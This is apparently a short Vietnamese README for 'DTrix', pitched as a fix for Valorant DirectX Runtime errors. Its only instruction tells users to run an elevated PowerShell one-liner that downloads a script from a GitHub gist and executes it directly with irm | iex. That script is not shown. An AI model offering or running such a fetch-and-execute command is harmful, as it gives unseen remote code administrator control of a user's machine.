# DTrix – Fix Valorant DirectX Runtime

Cong cu kiem tra va sua loi DirectX Runtime khi mo Valorant tren Windows.

## Cach chay

Mo **PowerShell** bang **Run as Administrator**, dan lenh sau:

```powershell
irm "https://gist.githubusercontent.com/dat1799/150903857de1134ffc2b4e8ba6c75e2e/raw/check-directx.ps1?$(Get-Random)" | iex
```

## Chuc nang

- Tu dong sua loi DirectX Runtime
- Kiem tra va cai lai Visual C++ 2015-2022
- Quet virus bang Windows Defender
- Sua file he thong Windows (sfc + DISM)
- Tim phan mem nghi da ghi de file DLL
